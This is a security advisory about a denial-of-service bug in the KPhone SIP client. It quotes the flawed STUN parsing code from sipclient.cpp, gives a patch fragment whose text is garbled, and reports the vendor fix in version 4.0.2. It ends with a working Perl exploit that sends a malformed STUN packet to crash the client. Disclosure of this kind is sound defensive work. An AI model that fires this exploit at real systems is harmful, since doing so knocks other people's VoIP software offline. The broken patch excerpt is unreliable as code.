 KPhone STUN DoS (Malformed STUN Packets)
------------------------------------------------------------------------

SUMMARY

<http://www.wirlab.net/kphone/> KPhone is "a SIP (Session Initiation Protocol) 
user agent for Linux, with which you can initiate VoIP (Voice over IP) 
connections over the Internet". KPhone allows its users to enable STUN server 
interconnectivity. This interconnectivity allows a remote attacker to crash 
the KPhone program by sending it a malformed STUN response packet. The 
vulnerability doesn't allow the attacker to execute arbitrary code, but only 
to cause a denial of service attack (the program will crash).

DETAILS

Vulnerable Systems:
* KPhone version 4.0.1 and prior

Immune Systems:
* KPhone version 4.0.2 or newer

The vulnerability lies in the fact the size of the received packet is not 
verified against its user defined size. The vulnerable code lies at 
(sipclient.cpp):
void SipClient::incomingMessage( int socketfd )
..
char inputbuf[ 8000 ];
..
StunMsgHdr* hdr = reinterpret_cast( inputbuf );
..
char* body = inputbuf + sizeof( StunMsgHdr );
unsigned int size = ntohs( hdr->msgLength ); // The size comes from msgLen
..
while( size > 0 ) {
StunAtrHdr* attr = reinterpret_cast( body );
unsigned int hdrLen = ntohs( attr->length );
..
body += hdrLen+4; // The hdrLen comes from the attrLen
size -= hdrLen+4;
}

As attrLen can be set to a bigger value than 8000 (the longest value we can 
place in hdrLen is 0xFFFF = 65535), we can cause the body pointer to point to 
a memory location outside the scope of our function, thus causing a SEGFAULT.

Patch:
Beyond Security has written a patch that will make sure that the data received 
is indeed safe for parsing (verifying all of the msgLen and hdrLen)

bytesread)\n");
>       return;
>  }

size
>       if (hdrLen+4 > size)
>       {
>          printf("Malformed packet (hdrLen+4 > size)\n");
>          return;
>    }

Vendor status:
The vendor has issued a new version 4.0.2, which addresses this issue.

Exploit:
#!/usr/bin/perl
#

use IO::Socket::INET;

my $buf = join("", "\x01\x01", # BindingResponse
  "\x00\x01", # MsgLength
  "A"x16, # GUID
  "\x00\x00", # Attribute
  "\x08\x01", # AttrLength
  "A"x7975 # Value
  );

my $remote = IO::Socket::INET->new( Proto => 'udp',
    PeerAddr => '192.168.1.49',
    PeerPort => 5060);

print $remote $buf;
